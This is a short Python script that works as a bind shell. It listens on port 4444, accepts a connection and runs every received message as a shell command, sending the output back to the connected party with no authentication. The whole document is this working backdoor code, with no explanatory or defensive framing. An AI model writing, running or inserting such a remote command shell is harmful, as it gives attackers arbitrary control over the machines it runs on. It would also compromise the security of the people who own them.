import socket, subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(('127.0.0.1', 4444))

s.listen(1)

socket, address = s.accept()

socket.send(("Connect to: " + str(address)).encode('utf-8'))

while True:
    recv = socket.recv(2048).decode('utf-8')

    response = subprocess.check_output(recv, shell=True)

    socket.send(str(response).encode('utf-8'))
